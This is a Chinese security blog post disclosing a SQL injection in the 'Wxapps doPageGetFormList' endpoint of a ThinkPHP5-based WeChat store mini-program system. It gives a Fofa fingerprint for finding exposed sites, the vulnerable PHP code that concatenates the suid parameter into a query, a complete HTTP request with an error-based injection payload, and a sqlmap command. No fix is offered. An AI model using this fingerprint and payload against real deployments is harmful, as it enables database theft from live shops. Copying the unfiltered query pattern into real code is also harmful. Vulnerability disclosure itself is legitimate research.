#  某微信万能门店小程序系统存在前台SQL注入漏洞   
原创 Mstir  星悦安全   2024-11-22 03:42  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
- █   
远山起风又起雾 无人知我来时路  
 █  
  
- **万能门店小程序DIY建站无限独立版非微擎应用，独立版是基于国内很火的ThinkPHP5框架开发的，适用于各行各业小程序、企业门店小程序！**  
  
- **万能门店微信小程序不限制小程序生成数量，支持多页面，预约功能等。 本套源码包含多商户插件、点餐插件、拼团插件、积分兑换、小程序手机客服等全套十个插件模块。**  
  
- **支持后台一键扫码上传小程序，和后台通用模板。**  
  
- **增加了：抖音/头条小程序，百度小程序，支付宝小程序，qq小程序，H5端**  
  
**Fofa指纹:**  
```
"/comhome/cases/index.html"
```  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNYFEuuhHqEVQ5waZZ2ulOAQkmvWFZic2p7hrrbwQNmicEUjhvwJnNGJSLTQt0eRoJhThxicgozX74Q/640?wx_fmt=other&from=appmsg "")  
  
后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNYFEuuhHqEVQ5waZZ2ulO8oicUdGjMgMtsynwsmn8vpbLibQeo8IndG8npvOW7ff0yISfWJjfoeuQ/640?wx_fmt=jpeg "")  
  
框架:ThinkPHP 5 Debug:False  
## 0x01 漏洞分析&复现  
  
**位于 /api/controller/Wxapps.php 控制器的doPageGetFormList 方法通过input方法传入suid 参数进入SQL查询中，且未有过滤，导致漏洞产生.**  
```
//获取我的表单提交信息列表
public function doPageGetFormList()  {
    $uniacid = input('uniacid');
    $openid = input('openid');
    $suid = input('suid');
    $pageindex = max(1, intval(input('page')));
    $pagesize = 10;
    $prefix = config('database.prefix');
    $formset = Db::query("SELECT a.id,a.cid,a.creattime,a.flag,a.source,a.fid FROM {$prefix}wd_xcx_formcon as a left join {$prefix}wd_xcx_products as b on a.cid = b.id and a.uniacid = b.uniacid WHERE a.suid = '{$suid}' and a.uniacid = {$uniacid} and (a.source is null or a.source <> 'VIP申请') and (b.type = 'showArt' or b.type is null) ORDER BY a.id DESC LIMIT " . ($pageindex - 1) * $pagesize . "," . $pagesize);
    if ($formset) {
      foreach ($formset as $key => &$res) {
        $pro = Db::query("SELECT title,formset FROM {$prefix}wd_xcx_products WHERE id = {$res['cid']} and uniacid = {$uniacid}");
        if ($pro) {
          $pro = $pro[0];
          $res['title'] = $pro['title'];
          $res['formtitle'] = Db::name('wd_xcx_formlist')->where("uniacid", $uniacid)->where("id", $pro['formset'])->value("formname");
          $res['formtitle'] = "文章-" . $pro['title'] . "-" . $res['formtitle'];
        } else {
          $res['title'] = "";
          $res['formtitle'] = Db::name('wd_xcx_formlist')->where("uniacid", $uniacid)->where("id", $res['fid'])->value("formname");
          $res['formtitle'] = "DIY-" . $res['formtitle'];
        }
        $res['creattime'] = date("Y-m-d H:i:s", $res['creattime']);
      }
    }
    $result['data'] = $formset;
    return json_encode($result);
  }

```  
  
**Payload:**  
```
POST /api/wxapps/doPageGetFormList HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 85
Content-Type: application/x-www-form-urlencoded
Cookie: Hm_lvt_d3b3b1b968a56124689d1366adeacf8f=1731328644; _ga=GA1.1.2095806093.1731475984; mysid=50ada153bbeed41d23f7435c73e56ddb; Hm_lvt_22fbf4ec0601742141df7f652a137a5c=1731635709; PHPSESSID=1cpts6dcp8926ur7pc80rud3a1
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/api/wxapps/doPageGetFormList
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

suid=' AND GTID_SUBSET(CONCAT((SELECT (user()))),3119)-- bdmV
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cNQYaAa6DaI0FBYJfCE7jibEYT9dp1jtsDgoQqmLD1u9LuuTwU9uVW95aldAHGDzaiblHdWTViaffwQ/640?wx_fmt=other&from=appmsg "")  
  
**python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cNQYaAa6DaI0FBYJfCE7jibslmH7x7IUiahwhVmVicYeCKRlgos0B4SJGepMJ3ghlY7EDphxYdBjKbQ/640?wx_fmt=other&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**万能门店源码关注公众号发送 241119 获取!**  
  
  
  
  
下方二维  
码添加好友，回复关键词   
**星悦安全**  
进群  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8CGA5xDtuNnCSVGd0ibW86zZaJ6tr5ib17xnMbupUibq24HQEl4gRoptsVgCBSNnwBEGmSn3a4ftXVzQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AOzYX7kxefGbGGZg3g1ltkN30q9hceg23PiczgUqMT0EE9w0fLK9uw1eKWwQX9TljXQe1OQeHRZ2Q/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
